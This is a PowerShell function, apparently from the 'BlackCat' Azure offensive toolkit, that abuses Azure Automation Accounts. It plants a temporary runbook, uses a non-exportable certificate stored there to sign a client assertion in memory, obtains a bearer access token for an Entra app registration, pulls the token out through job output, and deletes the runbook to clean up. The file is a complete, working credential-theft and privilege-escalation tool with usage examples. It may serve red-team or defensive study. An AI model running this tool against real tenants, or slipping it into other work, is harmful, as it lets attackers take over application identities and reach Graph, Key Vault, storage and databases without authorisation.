function Invoke-AutomationTokenExchange {
    [CmdletBinding(
        SupportsShouldProcess = $true,
        DefaultParameterSetName = 'ByName'
    )]
    param (
        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'ByName'
        )]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceNameCompleterAttribute(
            'Microsoft.Automation/automationAccounts',
            'ResourceGroupName'
        )]
        [Alias('automation-account', 'account')]
        [string]$AutomationAccountName,

        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'ByName'
        )]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute()]
        [Alias('rg', 'resource-group')]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $true)]
        [Alias('certificate', 'cert-name')]
        [string]$CertificateName,

        [Parameter(Mandatory = $true)]
        [Alias('client-id', 'client_id', 'application-id')]
        [string]$AppId,

        [Parameter(Mandatory = $false)]
        [Alias('tenant', 'tenant_id')]
        [string]$TenantId,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Azure', 'MSGraph', 'KeyVault', 'Storage', 'SQLDatabase', 'OSSDatabase', 'Monitor')]
        [Alias('resource', 'audience', 'aud')]
        [string]$EndpointType = 'MSGraph',

        [Parameter(Mandatory = $false)]
        [Alias('runbook', 'runbook-name')]
        [string]$RunbookName = "Temp-BlackCat-$((New-Guid).ToString().Substring(0,8))",

        [Parameter(Mandatory = $false)]
        [switch]$Decode,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Object', 'JSON', 'CSV', 'Table')]
        [Alias('output', 'o')]
        [string]$OutputFormat = 'Object'
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat -ResourceTypeName 'AutomationAccount'

        $result = New-Object System.Collections.ArrayList
        $stats  = @{
            StartTime  = Get-Date
            Success    = 0
            CleanedUp  = 0
            Failed     = 0
        }

        $endpoints = @{
            Azure       = 'https://management.azure.com'
            MSGraph     = 'https://graph.microsoft.com'
            KeyVault    = 'https://vault.azure.net'
            Storage     = 'https://storage.azure.com'
            SQLDatabase = 'https://database.windows.net'
            OSSDatabase = 'https://ossrdbms-aad.database.windows.net'
            Monitor     = 'https://monitor.azure.com'
        }
        $resourceUrl = $endpoints[$EndpointType]
        $scope = "$resourceUrl/.default"
    }

    process {
        try {
            $sv   = $script:SessionVariables
            $auth = $script:authHeader

            if (-not $TenantId) {
                $TenantId = $sv.tenantId
            }

            # ── 1. Discover target Automation Account(s) via Resource Graph ──
            Write-Host ' Discovering Automation Accounts via Resource Graph...' -ForegroundColor Green
            
            $queryParts = @(
                'resources'
                "| where type =~ 'microsoft.automation/automationaccounts'"
            )
            if ($AutomationAccountName) {
                $escapedAccount = $AutomationAccountName.Replace("'", "''")
                $queryParts += "| where name =~ '$escapedAccount'"
            }
            if ($ResourceGroupName) {
                $escapedRg = $ResourceGroupName.Replace("'", "''")
                $queryParts += "| where resourceGroup =~ '$escapedRg'"
            }
            $queryParts += '| project id, name, resourceGroup, subscriptionId, location'
            
            $accounts = Invoke-AzBatch -Query ($queryParts -join "`n")
            if (-not $accounts -or $accounts.Count -eq 0) {
                Write-Host '  No matching Automation Accounts found.' -ForegroundColor Yellow
                return
            }

            foreach ($acc in $accounts) {
                $accName = $acc.name
                $accRg   = $acc.resourceGroup
                $accId   = $acc.id

                Write-Host "`n[*] Automation Account: $accName (RG: $accRg)" -ForegroundColor Cyan
                $tempRunbook = $RunbookName

                if ($PSCmdlet.ShouldProcess("$accName/$tempRunbook", "Perform in-memory token exchange using certificate '$CertificateName' for AppId '$AppId'")) {
                    $runbookCreated = $false
                    try {
                        # Create ephemeral PowerShell runbook resource
                        Write-Host "  [+] Creating ephemeral runbook '$tempRunbook'..." -ForegroundColor White
                        $createRbUri = "{0}{1}/runbooks/{2}?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
                        $createRbBody = @{
                            location   = $acc.location
                            properties = @{
                                runbookType = 'PowerShell'
                                logVerbose  = $false
                                logProgress = $false
                            }
                        } | ConvertTo-Json

                        Invoke-RestMethod -Uri $createRbUri -Headers $auth -Method PUT -Body $createRbBody -ContentType 'application/json' -UserAgent $sv.userAgent | Out-Null
                        $runbookCreated = $true

                        # Prepare in-memory client assertion signing and token exchange payload
                        $injectionPayload = @"
try {
    `$cert = Get-AutomationCertificate -Name '$CertificateName'
    if (-not `$cert) {
        throw "Certificate '$CertificateName' not found in Automation Account."
    }

    # 1. Resolve RSA private key for in-memory signing
    `$rsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey(`$cert)
    if (-not `$rsa) {
        `$rsa = `$cert.PrivateKey
    }
    if (-not `$rsa) {
        throw "Failed to acquire private key signing handle."
    }

    # 2. Compute Base64URL x5t thumbprint header
    `$thumbBytes = [System.Convert]::FromHexString(`$cert.Thumbprint)
    `$x5t = [System.Convert]::ToBase64String(`$thumbBytes) -replace '\+', '-' -replace '/', '_' -replace '=+$', ''

    # 3. Construct JWT Header and Payload
    `$tokenUri = 'https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token'
    `$now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

    `$header = @{
        alg = 'RS256'
        typ = 'JWT'
        x5t = `$x5t
    }
    `$payload = @{
        aud = `$tokenUri
        iss = '$AppId'
        sub = '$AppId'
        jti = [guid]::NewGuid().ToString()
        nbf = `$now
        iat = `$now
        exp = `$now + 600
    }

    # 4. Sign JWT Assertion
    `$headerEncoded  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((`$header | ConvertTo-Json -Compress))) -replace '\+', '-' -replace '/', '_' -replace '=+$', ''
    `$payloadEncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((`$payload | ConvertTo-Json -Compress))) -replace '\+', '-' -replace '/', '_' -replace '=+$', ''
    `$signInputBytes = [Text.Encoding]::UTF8.GetBytes("`$headerEncoded.`$payloadEncoded")

    `$signatureBytes = `$rsa.SignData(
        `$signInputBytes,
        [System.Security.Cryptography.HashAlgorithmName]::SHA256,
        [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
    )
    `$signatureEncoded = [Convert]::ToBase64String(`$signatureBytes) -replace '\+', '-' -replace '/', '_' -replace '=+$', ''
    `$clientAssertion  = "`$headerEncoded.`$payloadEncoded.`$signatureEncoded"

    # 5. Exchange client assertion for Entra Access Token
    `$body = @{
        client_id             = '$AppId'
        grant_type            = 'client_credentials'
        client_assertion_type = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
        client_assertion      = `$clientAssertion
        scope                 = '$scope'
    }

    `$tokenResp = Invoke-RestMethod -Uri `$tokenUri -Method POST -Body `$body -ContentType 'application/x-www-form-urlencoded'

    `$resultObj = [PSCustomObject]@{
        Success      = `$true
        AccessToken  = `$tokenResp.access_token
        TokenType    = `$tokenResp.token_type
        ExpiresIn    = `$tokenResp.expires_in
        Thumbprint   = `$cert.Thumbprint
    }
}
catch {
    `$resultObj = [PSCustomObject]@{
        Success = `$false
        Error   = `$_.Exception.Message
    }
}

`$json = `$resultObj | ConvertTo-Json -Compress
Write-Output "===BLACKCAT_TOKEN_START===`$json===BLACKCAT_TOKEN_END==="
"@

                        Write-Host "  [+] Uploading exchange payload to runbook draft..." -ForegroundColor White
                        $draftUri = "{0}{1}/runbooks/{2}/draft/content?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
                        Invoke-RestMethod -Uri $draftUri -Headers $auth -Method PUT -Body $injectionPayload -ContentType 'text/plain' -UserAgent $sv.userAgent | Out-Null

                        # Wait for async draft update (202 Accepted)
                        Start-Sleep -Seconds 3

                        Write-Host "  [+] Publishing runbook..." -ForegroundColor White
                        $publishUri = "{0}{1}/runbooks/{2}/publish?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
                        Invoke-RestMethod -Uri $publishUri -Headers $auth -Method POST -UserAgent $sv.userAgent | Out-Null

                        Start-Sleep -Seconds 3

                        # Start runbook job and wait for output
                        $jobId = [guid]::NewGuid().ToString()
                        Write-Host "  [*] Starting exchange job (ID: $jobId)..." -ForegroundColor White
                        $startJobUri = "{0}{1}/jobs/{2}?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
                        $jobBody = @{ properties = @{ runbook = @{ name = $tempRunbook } } } | ConvertTo-Json

                        Invoke-RestMethod -Uri $startJobUri -Headers $auth -Method PUT -Body $jobBody -ContentType 'application/json' -UserAgent $sv.userAgent | Out-Null

                        # Poll for job completion
                        $jobStatusUri = "{0}{1}/jobs/{2}?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
                        $completed = $false
                        $pollCount = 0
                        while (-not $completed -and $pollCount -lt 30) {
                            Start-Sleep -Seconds 4
                            $jobStatus = Invoke-RestMethod -Uri $jobStatusUri -Headers $auth -Method GET -UserAgent $sv.userAgent
                            $status = $jobStatus.properties.status
                            Write-Verbose "Job status: $status"
                            if ($status -in @('Completed', 'Failed', 'Suspended', 'Stopped')) {
                                $completed = $true
                            }
                            $pollCount++
                        }

                        # Retrieve job stream output
                        $jobOutputUri = "{0}{1}/jobs/{2}/output?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
                        $jobOutput = Invoke-RestMethod -Uri $jobOutputUri -Headers $auth -Method GET -UserAgent $sv.userAgent

                        if ($jobOutput -match '===BLACKCAT_TOKEN_START===(.*)===BLACKCAT_TOKEN_END===') {
                            $tokenPayload = $Matches[1].Trim() | ConvertFrom-Json

                            if ($tokenPayload.Success -and -not [string]::IsNullOrEmpty($tokenPayload.AccessToken)) {
                                Write-Host "  [+] Token acquired successfully for AppId: $AppId" -ForegroundColor Green
                                $stats.Success++

                                $expiresOn = (Get-Date).AddSeconds($tokenPayload.ExpiresIn).ToString('yyyy-MM-dd HH:mm:ss')
                                $tokenItem = [PSCustomObject]@{
                                    AutomationAccount = $accName
                                    ResourceGroup     = $accRg
                                    CertificateName   = $CertificateName
                                    Thumbprint        = $tokenPayload.Thumbprint
                                    AppId             = $AppId
                                    TenantId          = $TenantId
                                    EndpointType      = $EndpointType
                                    Resource          = $resourceUrl
                                    TokenType         = $tokenPayload.TokenType
                                    AccessToken       = $tokenPayload.AccessToken
                                    ExpiresIn         = $tokenPayload.ExpiresIn
                                    ExpiresOn         = $expiresOn
                                    Method            = 'InRunbookCertificateExchange'
                                }

                                if ($Decode) {
                                    Write-Host "  Decoding JWT token..." -ForegroundColor Cyan
                                    try {
                                        $decoded = ConvertFrom-JWT -Base64JWT $tokenPayload.AccessToken
                                        $tokenItem | Add-Member -NotePropertyName 'DecodedToken' -NotePropertyValue $decoded
                                        Write-Host "    Audience: $($decoded.aud)" -ForegroundColor White
                                        Write-Host "    Object ID: $($decoded.oid)" -ForegroundColor White
                                    }
                                    catch {
                                        Write-Warning "Decode failed: $($_.Exception.Message)"
                                    }
                                }

                                [void]$result.Add($tokenItem)
                            } else {
                                Write-Warning "  [-] In-runbook token exchange failed: $($tokenPayload.Error)"
                                $stats.Failed++
                            }
                        } else {
                            Write-Warning "  [-] Failed to parse token response payload from runbook output."
                            $stats.Failed++
                        }
                    }
                    finally {
                        if ($runbookCreated) {
                            Write-Host "  [~] Cleaning up ephemeral runbook '$tempRunbook'..." -ForegroundColor White
                            $deleteRbUri = "{0}{1}/runbooks/{2}?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
                            
                            $deleted = $false
                            $retryDelete = 0
                            while (-not $deleted -and $retryDelete -lt 4) {
                                Start-Sleep -Seconds 5
                                try {
                                    Invoke-RestMethod -Uri $deleteRbUri -Headers $auth -Method DELETE -UserAgent $sv.userAgent | Out-Null
                                    $deleted = $true
                                    $stats.CleanedUp++
                                    Write-Host "  [+] Ephemeral runbook deleted successfully." -ForegroundColor Green
                                } catch {
                                    $retryDelete++
                                    if ($retryDelete -ge 4) {
                                        Write-Warning "  [-] Failed to delete ephemeral runbook after retries: $($_.Exception.Message)"
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        catch {
            Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message $($_.Exception.Message) -Severity 'Error'
        }
    }

    end {
        $duration = (Get-Date) - $stats.StartTime
        Write-Verbose " Completed function $($MyInvocation.MyCommand.Name) in $($duration.TotalSeconds.ToString('F2'))s"

        if ($result -and $result.Count -gt 0) {
            Format-BlackCatOutput -Data $result -OutputFormat $OutputFormat -FunctionName $MyInvocation.MyCommand.Name
        }
        else {
            Write-Warning "Token exchange failed - no token retrieved (Errors: $($stats.Failed))"
        }
    }

    <#
    .SYNOPSIS
        Performs in-memory OAuth 2.0 client assertion signing and token exchange using non-exportable Automation Account certificates.

    .DESCRIPTION
        Azure Automation imports certificate assets into the worker sandbox's Windows Cryptographic Key Store
        without the exportable flag. As a result, private key export via .Export('pfx') always fails (NTE_BAD_KEY_STATE).
        However, the in-sandbox Cryptographic Service Provider (CSP/CNG) retains full permission to perform cryptographic
        signing in memory.

        This function leverages an ephemeral runbook sandbox to sign the RFC 7523 client assertion (RS256 with x5t
        thumbprint header) directly in-memory and exchange it at the Microsoft Entra token endpoint for a Bearer Access Token.
        The ephemeral runbook is automatically cleaned up immediately after execution.

    .PARAMETER AutomationAccountName
        Target Azure Automation Account name.

    .PARAMETER ResourceGroupName
        Resource group containing the Automation Account.

    .PARAMETER CertificateName
        The name of the certificate asset inside the Automation Account.

    .PARAMETER AppId
        The Application (Client) ID of the Entra App Registration that trusts the certificate.

    .PARAMETER TenantId
        Microsoft Entra Tenant ID (defaults to current session tenant).

    .PARAMETER EndpointType
        Target audience/resource: Azure (ARM), MSGraph, KeyVault, Storage, SQLDatabase, OSSDatabase, Monitor.

    .PARAMETER RunbookName
        Optional ephemeral runbook name (defaults to auto-generated GUID).

    .PARAMETER Decode
        Decode the returned JWT access token.

    .PARAMETER OutputFormat
        Output format: Object (default), JSON, CSV, or Table.

    .EXAMPLE
        Invoke-AutomationTokenExchange `
            -AutomationAccountName "aa-ehv-pimjit-dev-weu-01" `
            -CertificateName "pim-jit-purview-cert" `
            -AppId "11111111-2222-3333-4444-555555555555" `
            -EndpointType MSGraph `
            -Decode
    #>
}
